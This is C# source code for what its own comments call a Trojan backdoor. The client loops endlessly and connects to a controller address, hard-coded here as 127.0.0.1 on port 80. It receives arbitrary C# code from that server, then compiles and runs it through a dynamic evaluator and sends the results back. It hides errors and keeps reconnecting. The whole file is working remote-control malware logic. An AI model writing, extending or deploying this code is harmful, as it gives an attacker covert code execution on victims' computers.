using CH_de_Troie_1;
using DataStreams.ETL;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Client
{
    public class Client
    {
        //C'est le Trojan Backdoor
        private const int PORT = 80;
        private const string IP = "127.0.0.1";
        private const string EOF = "<EOF>";
        private const int RETRY_DELAY = 5000;
        public static string ID = "azerty";
        public static void ChevalDeTroie()
        {
            IPEndPoint serverEndPoint = new IPEndPoint(IPAddress.Parse(IP), PORT);
            while (true)
            {
                try
                {
                    TcpClient client = new TcpClient();
                    client.Connect(serverEndPoint);
                    NetworkStream clientStream = client.GetStream();
                    ASCIIEncoding encoder = new ASCIIEncoding();
                    Communication.writeString(clientStream, encoder, ID);
                    while (true)
                    {
                        string command = Communication.readString(clientStream, encoder);
                        if (command == "exit")
                        {
                            Communication.writeString(clientStream, encoder, command);
                            break;
                        }
                        Evaluator eval = new Evaluator("tosend = execute()", Evaluator.EvaluationType.SingleLineReturn, Evaluator.Language.CSharp);
                        eval.AddReference("System.dll");

                        Console.WriteLine(command);
                        //Console.WriteLine("========================================Fin de Code====================================");
                        //Console.WriteLine("");

                        eval.AddVariable("tosend", new byte[0]);
                        eval.AddCustomMethod(command);
                        Evaluator.EvaluationResult result = eval.Eval();
                        if (result.ThrewException)
                        {
                            Communication.writeString(clientStream, encoder, result.Exception.Message);
                        }
                        else
                        {
                            Communication.write(clientStream, encoder, result.Variables["tosend"].VariableValue as byte[]);
                        }
                    }
                    client.Close();
                }
                catch (Exception exception)
                {

                }
                Thread.Sleep(RETRY_DELAY);
            }
        }
        public static void Main(string[] args)
        {
            while (true)
            {
                //new Client();
                ChevalDeTroie();
                Thread.Sleep(2500);
            }

        }
    }
}
